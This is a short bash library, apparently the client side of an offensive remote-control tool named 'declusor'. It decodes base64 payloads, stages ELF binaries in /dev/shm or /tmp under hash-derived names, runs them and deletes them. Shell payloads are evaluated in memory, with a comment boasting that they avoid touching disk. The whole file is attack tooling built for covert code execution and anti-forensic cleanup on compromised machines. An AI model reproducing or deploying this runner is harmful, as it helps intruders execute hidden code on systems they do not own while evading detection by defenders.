_declusor_b64_decode() {
    if command -v base64 >/dev/null 2>&1; then
        base64 -d 2>/dev/null || base64 -D 2>/dev/null
    elif command -v openssl >/dev/null 2>&1; then
        openssl enc -d -base64 2>/dev/null
    elif command -v python3 >/dev/null 2>&1; then
        python3 -c 'import sys, base64; sys.stdout.buffer.write(base64.b64decode(sys.stdin.read()))' 2>/dev/null
    elif command -v perl >/dev/null 2>&1; then
        perl -MMIME::Base64 -e 'undef $/; print decode_base64(<>)' 2>/dev/null
    else
        return 1
    fi
}

_declusor_get_writable_dir() {
    for dir in /dev/shm /tmp /var/tmp "${TMPDIR:-/tmp}" .; do
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            echo "$dir"
            return 0
        fi
    done
    echo "/tmp"
}

function hash_value() {
    if [ "$1" ]; then
        if command -v sha256sum >/dev/null 2>&1; then
            printf '%s' "$1" | sha256sum | head -c 64
        elif command -v sha384sum >/dev/null 2>&1; then
            printf '%s' "$1" | sha384sum | head -c 96
        elif command -v sha512sum >/dev/null 2>&1; then
            printf '%s' "$1" | sha512sum | head -c 124
        elif command -v sha1sum >/dev/null 2>&1; then
            printf '%s' "$1" | sha1sum | head -c 40
        elif command -v md5sum >/dev/null 2>&1; then
            printf '%s' "$1" | md5sum | head -c 32
        else
            >&2 echo "can't hash data"
        fi
    else
        >&2 echo "data not found"
    fi
}

function store_base64_encoded_value() {
    if [ "$1" ]; then
        if [ -n "$2" ]; then
            filepath="$2"
        else
            datahash=$(hash_value "$1" 2>/dev/null)
            target_dir=$(_declusor_get_writable_dir)
            if [ "$datahash" ]; then
                filepath="$target_dir/$datahash.temp"
            else
                filepath="$target_dir/custom-file.temp"
            fi
        fi

        (printf '%s' "$1" | _declusor_b64_decode) > "$filepath" && echo "$filepath" || >&2 echo "cannot decode data"
    else
        >&2 echo "data not found"
    fi
}

function execute_base64_encoded_value() {
    if [ "$1" ]; then
        # Check if the payload is an ELF binary (starts with base64 f0VM...)
        if [[ "$1" == f0VM* ]]; then
            # Native binary executable - stage to disk in writable directory
            filepath=$(store_base64_encoded_value "$1" 2>/dev/null)
            shift
            if [ -n "$filepath" ] && [ -f "$filepath" ]; then
                chmod 700 "$filepath" 2>/dev/null && "$filepath" "$@"
                rm -f "$filepath"
            else
                >&2 echo "file doesn't exist"
            fi
        else
            # Shell script or text payload - execute 100% in-process memory without touching disk
            local code
            code="$(printf '%s' "$1" | _declusor_b64_decode)"
            shift
            ( set -- "$@"; eval "$code" )
        fi
    else
        >&2 echo "data not found"
    fi
}